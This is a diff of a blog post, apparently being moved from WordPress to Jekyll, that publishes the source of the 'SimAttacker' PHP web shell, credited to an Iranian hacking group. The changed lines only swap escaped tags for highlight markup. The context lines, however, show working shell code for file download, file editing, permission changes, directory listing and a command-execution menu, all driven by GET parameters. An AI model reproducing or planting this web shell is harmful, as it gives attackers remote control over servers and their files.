@@ -16,7 +16,7 @@ Coded by Hossein Asgary, an Iranian hacker who is part of Simorgh Security Group
 
 ### SimAttacker Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?
+{% highlight php %}<?
 //download Files  Code
 $fdownload=$_GET['fdownload'];
 if ($fdownload &lt;&gt; "" ){
@@ -30,7 +30,7 @@ header("Content-Length: " . filesize($name));
 fpassthru($fp);
 exit;
 }
-?&gt;
+?>
     
 &lt;html&gt;
 
@@ -45,7 +45,7 @@ body         { font-family: Tahoma; font-size: 8pt }
 &lt;/style&gt;
 &lt;/head&gt;
 &lt;body&gt;
-&lt;?
+<?
 error_reporting(E_ERROR | E_WARNING | E_PARSE);
 
  //File Edit
@@ -73,8 +73,8 @@ echo "&lt;/textarea&gt;
     }
 exit();
  }
-?&gt;
-&lt;?
+?>
+<?
 // CHmod - PRimission
 $fchmod=$_GET['fchmod'];
 if ($fchmod &lt;&gt; "" ){
@@ -94,7 +94,7 @@ echo "primission Not Allow change Chmod";
 }
 exit();
 }
-?&gt;
+?>
     
 &lt;div align="center"&gt;
     &lt;table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99" cellspacing="0" cellpadding="0" height="502"&gt;
@@ -106,9 +106,9 @@ exit();
                 &lt;font color="#D2D200" face="Tahoma" size="2"&gt;
                 &lt;span style="text-decoration: none"&gt;
                 &lt;font color="#000000"&gt;
-                &lt;a href="?id=fm&dir=&lt;?
+                &lt;a href="?id=fm&dir=<?
     echo getcwd();
-    ?&gt;
+    ?>
     "&gt;
                 &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;File Manager&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/span&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                 &lt;p align="center"&gt;&lt;b&gt;&lt;a href="?id=cmd"&gt;
@@ -128,7 +128,7 @@ exit();
                 &lt;span style="text-decoration: none"&gt;&lt;font color="#000000"&gt;About&lt;/font&gt;&lt;/span&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
                 &lt;p&gt;&nbsp;&lt;p align="center"&gt;&nbsp;&lt;/td&gt;
             &lt;td height="422" width="82%" style="border: 1px dotted #FFCC66" align="center"&gt;
-            &lt;?
+            <?
             //*******************************************************
             //Start Programs About US
             $id=$_GET['id'];
@@ -375,7 +375,7 @@ exit(0);
   
 
 }
-            ?&gt;
+            ?>
             
             &lt;/td&gt;
         &lt;/tr&gt;
@@ -394,7 +394,7 @@ exit(0);
 &lt;/body&gt;
 
 &lt;/html&gt;
-</pre>
+{% endhighlight %}
 
 ### SimAttacker Shell screenshot<figure id="attachment_409" style="width: 604px;" class="wp-caption aligncenter">
 
